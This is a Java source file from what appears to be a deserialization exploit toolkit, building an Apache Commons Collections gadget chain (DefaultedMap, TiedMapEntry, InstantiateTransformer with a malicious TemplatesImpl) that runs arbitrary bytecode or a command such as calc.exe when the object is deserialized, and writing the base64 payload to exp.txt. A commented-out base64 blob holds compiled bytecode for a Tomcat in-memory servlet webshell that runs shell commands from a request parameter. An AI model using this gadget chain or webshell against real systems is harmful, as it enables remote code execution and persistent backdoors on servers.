package xyz.eki.marshalexp.poc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.catalina.core.StandardContext;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import xyz.eki.marshalexp.gadget.jdk.GSignedObject;
import xyz.eki.marshalexp.gadget.rome.GCC6;
import xyz.eki.marshalexp.memshell.MJSP;
import xyz.eki.marshalexp.memshell.MSpringJNIController;
import xyz.eki.marshalexp.memshell.MTomcatFilter;
import xyz.eki.marshalexp.memshell.MTomcatServlet;
import xyz.eki.marshalexp.sink.jdk.GTemplates;
import xyz.eki.marshalexp.utils.MiscUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.xml.transform.Templates;
import javax.xml.transform.TransformerFactory;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.SignedObject;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Scanner;

public class MCC6 implements POC{

    @Override
    public Object getPocObject(byte[] bytes) throws Exception {
        HashMap innermap = new HashMap();
        //DefaultedMap map = (DefaultedMap) DefaultedMap.decorate(innermap,new FactoryTransformer());


//        Class proto = Class.forName("org.apache.commons.collections.functors.PrototypeFactory$PrototypeSerializationFactory");
//        Constructor protoCons = proto.getConstructor();


        InstantiateTransformer exp =  new InstantiateTransformer(new Class[]{Templates.class},new Object[]{GTemplates.getEvilTemplates(bytes)});

        DefaultedMap map = (DefaultedMap) DefaultedMap.decorate(innermap,exp);

        TiedMapEntry tiedmap = new TiedMapEntry(map,TrAXFilter.class);

        HashSet hashset = new HashSet(1);
        hashset.add("foo");

        Field field = Class.forName("java.util.HashSet").getDeclaredField("map");
        field.setAccessible(true);
        HashMap hashset_map = (HashMap) field.get(hashset);

        Field table = Class.forName("java.util.HashMap").getDeclaredField("table");
        table.setAccessible(true);
        Object[] array = (Object[])table.get(hashset_map);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node,tiedmap);

        return hashset;
    }
    @Override
    public Object getPocObject(String cmd) throws Exception {
        HashMap innermap = new HashMap();
        //DefaultedMap map = (DefaultedMap) DefaultedMap.decorate(innermap,new FactoryTransformer());


//        Class proto = Class.forName("org.apache.commons.collections.functors.PrototypeFactory$PrototypeSerializationFactory");
//        Constructor protoCons = proto.getConstructor();

//        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
//                new ConstantTransformer(TrAXFilter.class),
//                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{GTemplates.getEvilTemplates(cmd)})
//        });
        //ConstantFactory

        FactoryTransformer exp = new FactoryTransformer(
                new InstantiateFactory(Runtime.class,new Class[]{String.class},new Object[]{cmd})
                //new InstantiateFactory(TrAXFilter.class,new Class[]{Templates.class},new Object[]{GTemplates.getEvilTemplates(cmd)});
//                new ConstantFactory(GTemplates.getEvilTemplates(cmd))
                //PrototypeFactory.getInstance(GSignedObject.getSignedObject2Deserialize(SerializeUtils.serialize(GCC6.getRce(GTemplates.getEvilTemplates(cmd)))))
        );
        //InstantiateTransformer exp = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{GTemplates.getEvilTemplates(cmd)});
        //SignedObject exp = GSignedObject.getSignedObject2Deserialize(GTemplates.getEvilTemplates(cmd));

        //InstantiateTransformer exp =  new InstantiateTransformer(new Class[]{Templates.class},new Object[]{GTemplates.getEvilTemplates(cmd)});

        DefaultedMap map = (DefaultedMap) DefaultedMap.decorate(innermap,exp);

        TiedMapEntry tiedmap = new TiedMapEntry(map,TrAXFilter.class);

        HashSet hashset = new HashSet(1);
        hashset.add("foo");

        Field field = Class.forName("java.util.HashSet").getDeclaredField("map");
        field.setAccessible(true);
        HashMap hashset_map = (HashMap) field.get(hashset);

        Field table = Class.forName("java.util.HashMap").getDeclaredField("table");
        table.setAccessible(true);
        Object[] array = (Object[])table.get(hashset_map);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node,tiedmap);

        return hashset;
    }

    public static void main(String[] args) throws Exception {
        MCC6 gen = new MCC6();
//        ClassPool pool = ClassPool.getDefault();
//        CtClass cc = pool.get(E.class.getName());

        //clazz.setSuperclass(pool.get(Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet").getName()));
        //clazz.makeClassInitializer().insertBefore(code);
        //byte[][] bytecodes = new byte[][]{clazz.toBytecode()};

        String cmd = "calc.exe";
        //String code = "yv66vgAAADIA8AoANQBrCQBsAG0IAG4KAG8AcAgAcQgASgsAcgBzCgAPAHQIAHUKAGwAdgoAdwB4CgAPAHkIAHoKAA8AewcAfAgAfQgAfggAfwgAgAoAdwCBCgCCAIMHAIQKABYAhQgAhgoAFgCHCgAWAIgKABYAiQsAigCLCgCMAI0KAIwAjgoAjACPBwCQCgCRAJIKAJMAlAoAkwCVBwCWCgAkAJcLAJgAmQcAmgoAJwCbCwCcAJ0LAJwAngoAkQCfBwCgCwCcAKEKAJEAogsAnACjCgAnAKQIAKUKACcApgcApwoAMwCoBwCpAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACdMY29tL2NoYWl0aW4vdnVsZ2VuZXJpYy9NVG9tY2F0U2VydmxldDsBAAVkb0dldAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAAVvc1R5cAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQABcwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAANyZXEBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAARyZXNwAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEABnJlc3VsdAEAA2NtZAEABndyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEADVN0YWNrTWFwVGFibGUHAJAHAKoHAKsHAHwHAKwHAK0HAK4HAIQBAApFeGNlcHRpb25zBwCvBwCwAQAQTWV0aG9kUGFyYW1ldGVycwEACDxjbGluaXQ+AQAQZXZpbFNlcnZsZXRDbGFzcwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQALc2VydmxldE5hbWUBABV3ZWJhcHBDbGFzc0xvYWRlckJhc2UBADJMb3JnL2FwYWNoZS9jYXRhbGluYS9sb2FkZXIvV2ViYXBwQ2xhc3NMb2FkZXJCYXNlOwEAD3N0YW5kYXJkQ29udGV4dAEAKkxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0OwEAB3dyYXBwZXIBAB1Mb3JnL2FwYWNoZS9jYXRhbGluYS9XcmFwcGVyOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAUTGphdmEvbGFuZy9DbGFzczwqPjsHAKcBAApTb3VyY2VGaWxlAQATTVRvbWNhdFNlcnZsZXQuamF2YQwANgA3BwCxDACyALMBABVJbmplY3RlZCBDb2RlIFdvcmtpbmcHALQMALUAtgEAAAcAqgwAtwC4DAC5ALoBAAdvcy5uYW1lDAC7ALgHAKwMALwAvQwAvgC/AQADd2luDADAAMEBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jAQACc2gBAAItYwwAwgDDBwDEDADFAMYBABFqYXZhL3V0aWwvU2Nhbm5lcgwANgDHAQACXGEMAMgAyQwAygDLDADMAL8HAKsMAM0AzgcAzwwA0AC2DADRADcMANIANwEAJWNvbS9jaGFpdGluL3Z1bGdlbmVyaWMvTVRvbWNhdFNlcnZsZXQHANMMANQAvwcA1QwA1gDXDADYANkBADBvcmcvYXBhY2hlL2NhdGFsaW5hL2xvYWRlci9XZWJhcHBDbGFzc0xvYWRlckJhc2UMANoA2wcA3AwA3QDeAQAob3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dAwA3wDgBwDhDADiALYMAOMA5AwA5QDmAQAVamF2YXgvc2VydmxldC9TZXJ2bGV0DADnAOgMAOkAvwwA6gC2DADrAOwBAAUvZXZpbAwA7QDuAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwA7wA3AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQARamF2YS9sYW5nL1J1bnRpbWUBABNbTGphdmEvbGFuZy9TdHJpbmc7AQATamF2YS9pby9JbnB1dFN0cmVhbQEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABmxlbmd0aAEAAygpSQEAC2dldFByb3BlcnR5AQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAVwcmludAEABWZsdXNoAQAFY2xvc2UBAA9qYXZhL2xhbmcvQ2xhc3MBAA1nZXRTaW1wbGVOYW1lAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAxnZXRSZXNvdXJjZXMBACcoKUxvcmcvYXBhY2hlL2NhdGFsaW5hL1dlYlJlc291cmNlUm9vdDsBACNvcmcvYXBhY2hlL2NhdGFsaW5hL1dlYlJlc291cmNlUm9vdAEACmdldENvbnRleHQBAB8oKUxvcmcvYXBhY2hlL2NhdGFsaW5hL0NvbnRleHQ7AQANY3JlYXRlV3JhcHBlcgEAHygpTG9yZy9hcGFjaGUvY2F0YWxpbmEvV3JhcHBlcjsBABtvcmcvYXBhY2hlL2NhdGFsaW5hL1dyYXBwZXIBAAdzZXROYW1lAQAQc2V0TG9hZE9uU3RhcnR1cAEABChJKVYBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAKc2V0U2VydmxldAEAGihMamF2YXgvc2VydmxldC9TZXJ2bGV0OylWAQAHZ2V0TmFtZQEAD3NldFNlcnZsZXRDbGFzcwEACGFkZENoaWxkAQAiKExvcmcvYXBhY2hlL2NhdGFsaW5hL0NvbnRhaW5lcjspVgEAGGFkZFNlcnZsZXRNYXBwaW5nRGVjb2RlZAEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspVgEAD3ByaW50U3RhY2tUcmFjZQAhACAANQAAAAAAAwABADYANwABADgAAAAvAAEAAQAAAAUqtwABsQAAAAIAOQAAAAYAAQAAABEAOgAAAAwAAQAAAAUAOwA8AAAABAA9AD4AAwA4AAABtAAGAAgAAAC3sgACEgO2AAQSBU4rEga5AAcCADoEGQTGAIcZBLYACJ4AfxIJuAAKOgW4AAsZBcYALBkFtgAMEg22AA6ZAB8GvQAPWQMSEFNZBBIRU1kFKxIGuQAHAgBTpwAcBr0AD1kDEhJTWQQSE1NZBSsSBrkABwIAU7YAFLYAFToGuwAWWRkGtwAXEhi2ABk6BxkHtgAamQALGQe2ABunAAUSBU4suQAcAQA6BRkFLbYAHRkFtgAeGQW2AB+xAAAAAwA5AAAANgANAAAAMAAIADEACwAyABUAMwAiADQAKQA1AHsANgCLADcAngA5AKYAOgCsADsAsQA8ALYAPQA6AAAAXAAJACkAdQA/AEAABQB7ACMAQQBCAAYAiwATAEMARAAHAAAAtwA7ADwAAAAAALcARQBGAAEAAAC3AEcASAACAAsArABJAEAAAwAVAKIASgBAAAQApgARAEsATAAFAE0AAABNAAX/AFoABgcATgcATwcAUAcAUQcAUQcAUQABBwBS/wAYAAYHAE4HAE8HAFAHAFEHAFEHAFEAAgcAUgcAU/0AJwcAVAcAVUEHAFH4AAAAVgAAAAYAAgBXAFgAWQAAAAkCAEUAAABHAAAACABaADcAAQA4AAABIQADAAUAAABkEiBLKrYAIUy4ACK2ACPAACRNLLYAJbkAJgEAwAAnTi22ACg6BBkEK7kAKQIAGQQEuQAqAgAZBCq2ACvAACy5AC0CABkEKrYALrkALwIALRkEtgAwLRIxK7YAMqcACEsqtgA0sQABAAAAWwBeADMABAA5AAAAPgAPAAAAFQADABYACAAYABIAGQAfAB0AJQAeAC0AHwA1ACAAQwAhAE4AJQBUACgAWwArAF4AKQBfACoAYwAsADoAAAA+AAYAAwBYAFsAXAAAAAgAUwBdAEAAAQASAEkAXgBfAAIAHwA8AGAAYQADACUANgBiAGMABABfAAQAZABlAAAAZgAAAAwAAQADAFgAWwBnAAAATQAAAAkAAvcAXgcAaAQAAQBpAAAAAgBq";
        //byte[] code = MiscUtils.dumpClass(MJSP.class);
        //Object poc1 = gen.getPocObject(cc.toBytecode());
//
//        cc.defrost();
//        cc.detach();
        //Object poc1 = gen.getPocObject(code);
        //Object poc1 = gen.getPocObject(Base64.getDecoder().decode(code));
        Object poc1 = new CC9().getPocObject("calc.exe");


        byte[] test = SerializeUtils.serialize(poc1);

        BufferedWriter out = new BufferedWriter(new FileWriter("exp.txt"));
        out.write(Base64.getEncoder().encodeToString(test));
        out.close();
        //System.out.println(Base64.getEncoder().encodeToString(test));
        //SerializeUtils.serialize(poc1,"exp.bin");
        SerializeUtils.deserialize(SerializeUtils.serialize(poc1));
        //SerializeUtils.deserialize("exp.bin");
        ///SerializeUtils.deserialize("exp.bin","C:\\Users\\Eki\\Projects\\marshalexp\\fuzz\\serialkiller.xml");
    }
}
